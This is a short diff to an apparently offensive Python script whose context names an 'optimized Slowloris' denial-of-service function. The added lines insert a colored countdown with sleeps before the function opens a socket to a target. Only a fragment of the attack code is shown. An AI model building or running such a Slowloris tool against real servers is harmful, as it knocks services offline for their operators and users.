@@ -40,6 +40,17 @@ def authenticate():
 
 # Optimized Slowloris function with threading for faster execution
 def slowloris_thread(target, port):
+    time.sleep(5),
+    print("\033[96m                  ⟩⟩  MINUS 5 \033[0m "),
+    time.sleep(5),
+    print("\033[92m                  ⟩⟩  MINUS 4 \033[0m "),
+    time.sleep(5),
+    print("\033[1m                  ⟩⟩  MINUS 3 \033[0m "),
+    time.sleep(5),
+    print("\033[97m                  ⟩⟩  MINUS 2 \033[0m "),
+    time.sleep(5),
+    print("\033[95m                  ⟩⟩  MINUS 1 \033[0m "),
+    time.sleep(5),
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(4)
